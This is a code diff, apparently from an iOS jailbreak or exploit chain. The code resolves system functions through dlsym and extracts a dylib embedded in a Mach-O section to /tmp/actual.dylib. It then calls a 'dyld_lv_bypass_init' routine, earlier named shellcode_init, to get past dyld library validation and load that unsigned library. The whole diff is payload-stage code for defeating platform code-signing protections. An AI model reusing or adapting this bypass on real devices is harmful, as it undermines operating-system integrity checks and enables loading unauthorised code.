@@ -1,6 +1,5 @@
 @import Darwin;
 @import MachO;
-@import UIKit;
 #include <mach-o/ldsyms.h> /* _mh_dylib_header */
 
 // Function pointers
@@ -8,7 +7,8 @@ extern pthread_t pthread_main_thread_np(void);
 extern void _pthread_set_self(pthread_t p);
 void              (*_abort)(void);
 int               (*_close)(int);
-void *            (*_dlsym)(void *, const char *);
+void*             (*_dlsym)(void *, const char *);
+uint8_t*          (*_getsectiondata)(const struct mach_header_64 *, const char *, const char *, unsigned long *);
 thread_t          (*_mach_thread_self)(void);
 int               (*_open)(const char *, int, ...);
 void              (*__pthread_set_self)(pthread_t p);
@@ -17,45 +17,17 @@ int               (*_strncmp)(const char *s1, const char *s2, size_t n);
 kern_return_t     (*_thread_terminate)(mach_port_t);
 int               (*_write)(int, const void *, size_t);
 
-int shellcode_init(void * (*_dlsym)(void* handle, const char* symbol), const char *next_stage_dylib_path);
+int dyld_lv_bypass_init(void * (*_dlsym)(void* handle, const char* symbol), const char *next_stage_dylib_path);
 
-static uintptr_t _get_text_vmaddr(const struct mach_header_64 *mh) {
-    struct load_command *lc = (void*)((uintptr_t)mh + sizeof(struct mach_header_64));
-    for (uint32_t i = 0; i < mh->ncmds; i++, lc = (void*)((uint8_t*)lc + lc->cmdsize)) {
-        if (lc->cmd != LC_SEGMENT_64) continue;
-        struct segment_command_64 *seg = (void*)lc;
-        if (_strncmp(seg->segname, "__TEXT", 6) == 0)
-            return seg->vmaddr;
-    }
-    return 0;
-}
-static size_t macho_size_from_header(const struct mach_header_64 *mh) {
-    uintptr_t base       = (uintptr_t)mh;
-    uintptr_t text_vm    = _get_text_vmaddr(mh);
-    uintptr_t slide      = base - text_vm;  // ASLR slide
-
-    struct load_command *lc = (void*)(base + sizeof(struct mach_header_64));
-    for (uint32_t i = 0; i < mh->ncmds; i++, lc = (void*)((uint8_t*)lc + lc->cmdsize)) {
-        if (lc->cmd != LC_SEGMENT_64) continue;
-        struct segment_command_64 *seg = (void*)lc;
-        if (_strncmp(seg->segname, "__LINKEDIT", 10) != 0) continue;
-
-        // vmaddr + slide = actual mapped address of __LINKEDIT
-        // end = that + vmsize
-        return (seg->vmaddr + slide + seg->vmsize) - base;
-    }
-
-    return 0;
-}
-
-const char *save_myself(void) {
-    const char *path = "/tmp/SpringBoardTweak.dylib";
-    const struct mach_header_64 *header = (struct mach_header_64 *)&_mh_dylib_header;
-    size_t size = macho_size_from_header(header);
-    int fd = _open(path, O_RDWR | O_CREAT | O_TRUNC, 0755);
-    if (fd < 0) _abort();
+const char *save_actual_dylib(void) {
+    const char *path = "/tmp/actual.dylib";
+    int fd = _open(path, O_CREAT | O_WRONLY | O_TRUNC, 0644);
     
-    if (_write(fd, header, size) != size) {
+    //  -sectcreate __TEXT __actual_dylib <path to dylib>
+    
+    size_t dylib_size = 0;
+    const char *dylib = (const char *)_getsectiondata((struct mach_header_64 *)&_mh_dylib_header, "__TEXT", "__SBTweak", &dylib_size);
+    if (_write(fd, dylib, dylib_size) != dylib_size) {
         _abort();
     }
     _close(fd);
@@ -85,6 +57,7 @@ int last(void) {
     
     _abort = _dlsym(RTLD_DEFAULT, "abort");
     _close = _dlsym(RTLD_DEFAULT, "close");
+    _getsectiondata = _dlsym(RTLD_DEFAULT, "getsectiondata");
     _mach_thread_self = _dlsym(RTLD_DEFAULT, "mach_thread_self");
     _open = _dlsym(RTLD_DEFAULT, "open");
     _strncmp = _dlsym(RTLD_DEFAULT, "strncmp");
@@ -92,8 +65,8 @@ int last(void) {
     _write = _dlsym(RTLD_DEFAULT, "write");
     
     // setup dyld validation bypass
-    const char *path = save_myself();
-    shellcode_init(_dlsym, path);
+    const char *path = save_actual_dylib();
+    dyld_lv_bypass_init(_dlsym, path);
     
     // should not return
     _thread_terminate(_mach_thread_self());
